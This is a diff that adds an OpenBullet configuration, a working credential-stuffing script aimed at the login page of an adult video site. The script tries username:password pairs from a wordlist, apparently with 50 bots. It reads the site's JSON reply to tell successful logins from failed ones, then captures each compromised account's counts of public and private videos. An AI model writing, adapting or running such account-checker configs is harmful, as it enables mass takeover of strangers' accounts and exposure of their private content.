@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-3bcb1b76acd6c6ab1abfbc6e12360f32-LoliKEY",
+  "Name": "camwhores.tv",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-19T02:44:45.782096-04:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "juwan",
+  "Version": "1.2.2.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "http://www.camwhores.tv/login/" 
+  CONTENT "username=<USER>&pass=<PASS>&action=login&email_link=http%3A%2F%2Fwww.camwhores.tv%2Femail%2F&format=json&mode=async" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"failure\"," 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success\"," 
+
+REQUEST GET "http://www.camwhores.tv/my/videos/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Public PARSE "<SOURCE>" LR "is_private:0\">Public (" ")</a>" -> CAP "Pulblic Videos" 
+
+#Private PARSE "<SOURCE>" LR "is_private:1\">Private (" ")</a>" -> CAP "Private Videos" 
+
